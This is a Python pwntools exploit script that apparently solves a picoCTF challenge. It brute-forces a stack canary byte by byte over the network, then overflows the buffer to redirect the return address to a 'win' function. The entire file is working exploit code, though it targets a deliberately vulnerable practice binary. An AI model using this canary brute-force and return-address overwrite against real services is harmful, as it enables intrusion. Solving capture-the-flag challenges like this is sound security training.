from pwn import *

port = 55533
debug = 0
canary = ''

offset = 0xffffd048 - 0xffffd008        	# start of canary - start of buffer
offset2 = 0xffffd05c - 0xffffd048 - 4		# start of return address - start of canary - 4 bytes
length = offset

with context.quiet:
    for i in range(1, 5):
        length += 1
        for j in range(0xff):
            if not debug:
                p = remote('saturn.picoctf.net', port)
            else:
                p = process('./vuln')

            p.sendlineafter(b'> ', str(length).encode())

            payload = b'A' * offset                 # padding
            payload += canary.encode()              # part of canary
            payload += chr(j).encode()              # testing character
            p.sendlineafter(b'Input> ', payload)

            try:
                canary_return = p.recvline()
                if (canary_return != b'***** Stack Smashing Detected ***** : Canary Value Corrupt!\n'):
                    canary += chr(j)
                    p.close()
                    break
                p.close()
            except:
                p.close()

if not debug:
    p = remote('saturn.picoctf.net', port)
else:
    p = process('./vuln')

length = offset + 4 + offset2 + 4
print(p.recvline())
p.sendline(str(length).encode())

payload = b'A' * offset                 	# padding
payload += canary.encode()                      # canary
payload += b'A' * offset2			# padding 2
payload += p32(0x8049336)               	# win
print(p.recv())
print(p.recv())
p.sendline(payload)

print(p.recvline())
print(p.recvline())
